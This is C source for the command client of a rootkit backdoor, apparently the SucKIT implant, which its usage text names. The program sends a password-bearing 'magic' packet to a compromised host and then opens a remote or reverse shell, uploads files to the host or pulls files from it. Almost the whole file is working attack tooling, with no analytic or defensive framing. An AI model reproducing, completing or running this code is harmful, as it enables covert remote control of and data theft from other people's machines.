#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <arpa/inet.h>
#include <actions.h>
#include <netdb.h>
#include <config.h>
#include <termios.h>
#include <errno.h>
#include <stdlib.h>

int usage(char *s) {
    printf("Usage: %s -a {shell|down|up|check|listen} -h ip/hostname -l local_port -d dest_port [-f file] [-r]\n"
        "   -a: command to execute\n"
        "      * shell => launches a shell (-hd required)\n"
        "      * down => download a file (-hdf required)\n"
        "      * up => uploads a file (-hdf required)\n"
        "      * check => check if suckit is running on remote host (-hd required)\n"
        "      * listen => listens for a tty (-l required)\n"
		"   -r: launch the same command but in reverse mode (-l required)\n"
		"   -h: host or ip address\n"
		"   -l: local port to listen\n"
		"   -d: destination port to send magic\n"
        "   -f: file to upload or download\n"
        ,s);
	return -1;
}

void do_action(int action, int sock, char *file) {
    switch(action) {
        case UPLOAD:
            printf("Uploading file\n");
            client_upload(sock, file);
            break;
        case DOWNLOAD:
            printf("Downloading file\n");
            client_download(sock, file);
            break;
        case SHELL:
            printf("Launching shell\n");
            client_shell(sock);
            break;
        case RUPLOAD:
            printf("Reverse uploading file\n");
            client_upload(sock, file);
            break;
        case RDOWNLOAD:
            printf("Reverse downloading file\n");
            client_download(sock, file);
            break;
        case RSHELL:
            printf("Launching reverse shell\n");
            client_shell(sock);
            break;
        default:
            printf("Invalid option: %d\n", action);
    }
}

// Client actions
int client_shell(int sock) {
    struct termios oldterm, newterm; 
    char buf[BUFSIZE];

    // Terminal setup
    tcgetattr(0, &oldterm);
    newterm = oldterm;
    newterm.c_lflag &= ~(ICANON | ECHO | ISIG);
    newterm.c_iflag &= ~(IXON | IXOFF);
    tcsetattr(0, TCSAFLUSH, &newterm);

    while (1) {
        fd_set  fds;

        FD_ZERO(&fds);
        FD_SET(0, &fds);
        FD_SET(sock, &fds);
        errno = 0;
        if (select(sock + 1, &fds, NULL, NULL, NULL) < 0 && (errno != EINTR)) break;

        /* stdin => shell */
        if (FD_ISSET(0, &fds)) {
            int count = read(0, buf, BUFSIZE);
            if (count <= 0 && (errno != EINTR)) break;
            if (write(sock, buf, count) <= 0 && (errno != EINTR)) break;
        }

        /* shell => stdout */
        if (FD_ISSET(sock, &fds)) {
            int count = read(sock, buf, BUFSIZE);
            if (count <= 0 && (errno != EINTR)) break;
            if (write(1, buf, count) <= 0 && (errno != EINTR)) break;
        }
    }

    tcsetattr(0, TCSAFLUSH, &oldterm);
    perror("Connection disappeared");
    close(sock);

	return 0;
}

int client_upload(int sock, char *file) {
    int fd, bytes;
    char buf[BUFSIZE];
    unsigned long size, transfered;

    if ((fd = open(file, O_RDONLY)) < 0) {
        perror("open");
    } else {
        size = lseek(fd, 0, SEEK_END);
        lseek(fd, 0, SEEK_SET);
        bytes = 0;
        transfered = 0;
        printf("Size: %lu bytes\n", size);
        while ((bytes = read(fd, &buf, BUFSIZE)) > 0) {
            if ((transfered += write(sock, &buf, bytes)) < bytes) {
                printf("ERROR AL LLEGIR!\n");
            } else  {
                printf("\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\bUploaded: %u%%", (transfered/(1+(size/100))));
            }
        }
        printf("\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\bUploaded: 100%%\n");
        printf("Fitxer %s enviat!\n", file);
    }

    return 0;
}

int client_download(int sock, char *file) {
    int fd, bytes;
    char buf[BUFSIZE];
    char *ptr = strrchr(file, '/');
    if (ptr) { ptr++; }
    else { ptr = file; }

    if ((fd = open(ptr, O_RDWR|O_CREAT|O_TRUNC, S_IRWXU)) < 0) {
        perror("open");
    } else {
        bytes = 0;
        while ((bytes = read(sock, &buf, BUFSIZE)) > 0) {
            if (write(fd, &buf, bytes) < bytes) {
                printf("ERROR AL LLEGIR!\n");
            }
        }
        printf("Fitxer %s guardat!\n", ptr);
    }

    return 0;
}

unsigned long resolve(const char *host) {
    struct hostent *he;
    struct sockaddr_in si;
    
    he = gethostbyname(host);
    if (!he) {
        return INADDR_NONE;
    }
    memcpy((char *) &si.sin_addr, (char *) he->h_addr, sizeof(si.sin_addr));
    return si.sin_addr.s_addr;
}

/*unsigned long resolve(const char *host, char *ipname) {
    struct  hostent *he;
    struct  sockaddr_in si;
    
    he = gethostbyname(host);
    if (!he) {
        return INADDR_NONE;
    }
    memcpy((char *) &si.sin_addr, (char *) he->h_addr, sizeof(si.sin_addr));
    strcpy(ipname, inet_ntoa(si.sin_addr));
    return si.sin_addr.s_addr;
}*/

void start_daemon(int action, int port, char *file) {
    int sock_listen, sock_con;
    struct sockaddr_in srv;
    struct sockaddr_in cli;
    unsigned int slen = sizeof(cli);
    int one = 1;

    if (!fork()) return;
    
    sock_listen = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock_listen < 0) {
        perror("socket");
        exit(-1);
    }

    memset((char *) &srv, 0, sizeof(srv));
    srv.sin_family = AF_INET;
    srv.sin_addr.s_addr = htonl(INADDR_ANY);
    srv.sin_port = htons(port);

    // We want to reuse the source port port (avoiding bind errors)
    if (setsockopt(sock_listen, SOL_SOCKET, SO_REUSEADDR, (char *)&one, sizeof(one)) < 0)
        perror("setsockopt: reuseaddr");

    if (bind(sock_listen, (struct sockaddr *) &srv, sizeof(srv)) < 0) {
        perror("bind");
        exit(-1);
    }

    if (listen(sock_listen, 1) < 0) {
        perror("listen");
        exit(-1);
    }

    printf("Listening to port %d\n", port);

    sock_con = accept(sock_listen, (struct sockaddr *) &cli, &slen);
    close(sock_listen);
    if (sock_con < 0) {
        perror("accept");
        exit(-1);
    }

    printf("Received connection!\n");

    do_action(action, sock_con, file);

    exit(0);
}

int main(int argc, char *argv[]) {
	int opt, local_port = -1, dest_port = -1, action = -1, reverse = 0;
	char *host = 0, *cmd, *file = 0;
    unsigned long ip;
//    char ipname[256];
    struct data cmdpkt;
    struct sockaddr_in cli;

	// Read params
	while ((opt = getopt(argc, argv, "a:h:l:d:f:r") ) != EOF) {
        switch (opt) {
            case 'a':
                cmd = optarg;
                if (!strncmp(cmd, "shell", 5)) action = SHELL;
                else if (!strncmp(cmd, "down", 4)) action = DOWNLOAD;
                else if (!strncmp(cmd, "listen", 6)) action = LISTEN;
                else if (!strncmp(cmd, "up", 2)) action = UPLOAD;
                else if (!strncmp(cmd, "check", 5)) action = CHECK;
                break;
            case 'h':
				host = optarg;
				break;
            case 'l':
                if (sscanf(optarg, "%u\n", &local_port) != 1)
                    return usage(argv[0]);
                break;
            case 'd':
                if (sscanf(optarg, "%u\n", &dest_port) != 1)
                    return usage(argv[0]);
                break;
            case 'f':
                file=optarg;
                break;
			case 'r':
				reverse = 1;
				break;
            default:
                usage(argv[0]);
                return -1;
        }
    }

	// Check the parameters dependences
	if ((local_port > 65535) || (dest_port  > 65535) || (dest_port == -1) || 
		((action == SHELL)    && ((!host) || (dest_port == -1))) ||
		((action == UPLOAD)   && ((!host) || (dest_port == -1)   || (!file))) ||
		((action == DOWNLOAD) && ((!host) || (dest_port == -1)   || (!file))) ||
		((action == CHECK)    && ((!host) || (dest_port == -1))) ||
		((action == LISTEN)   && (local_port == -1)) || (action == -1) ||
		((reverse == 1) && (local_port == -1))) {
			return usage(argv[0]);
	}

	// Check hostname
	ip = resolve(host);
	//ip = resolve(host, ipname);
    if (ip == INADDR_NONE) {
        perror("host");
        return -1;
    }

	// Launch daemon if is a reverse command
	if (reverse || action == LISTEN) {
        switch (action) {
            case UPLOAD: action = RUPLOAD; break;
            case DOWNLOAD: action = RDOWNLOAD; break;
            case SHELL: action = RSHELL; break;
        }
		// Launch daemon and wait
        start_daemon(action, local_port, file);
        // Wait some time
        sleep(2);
	}

    if (action != LISTEN) {
        // TODO: retry several times 

        // Connect to skd
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            perror("socket");
            return -1;
        }
        memset(&cli, 0, sizeof(cli));
        cli.sin_family = AF_INET;
        cli.sin_port = htons(dest_port);
        cli.sin_addr.s_addr = ip;
        if (connect(sock, (struct sockaddr *) &cli, sizeof(cli)) < 0 ) {
            perror("connect");
            return -1;
        }

        // Generate packet
        memcpy(cmdpkt.pass, PASSWORD, strlen(PASSWORD));
        cmdpkt.port = local_port;
        cmdpkt.action = action;
        memcpy(cmdpkt.bytes, file, strlen(file));

        // Send packet
        write(sock, &cmdpkt, sizeof(cmdpkt));
        if (reverse) {
            close(sock);
        } else {
            do_action(action, sock, file);
            close(sock);    
        }
    }
	return 0;
}
